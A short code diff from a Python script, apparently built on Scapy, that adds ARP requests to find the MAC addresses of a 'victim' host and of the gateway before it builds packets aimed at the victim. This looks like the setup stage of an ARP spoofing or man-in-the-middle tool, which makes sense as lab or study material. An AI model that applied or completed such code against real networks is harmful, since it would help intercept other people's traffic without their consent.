@@ -39,6 +39,16 @@ gateway = gateway_parts[0]+ "."+gateway_parts[1]+ "."+gateway_parts[2]+ ".1"
 # print(str(my_ip) + " " + str(victim_ip) + " " + gateway)
 
 
+arp_packet = ARP(op=ARP.who_has, psrc=my_ip, pdst=victim_ip)
+result = sr1(arp_packet)
+victim_mac = result[ARP].hwsrc
+
+
+arp_packet = ARP(op=ARP.who_has, psrc=my_ip, pdst=gateway)
+result = sr1(arp_packet)
+gateway_mac = result[ARP].hwsrc
+
+#######################################################################################################################
 
 packet = IP(ttl=64)
 packet.dst = victim_ip
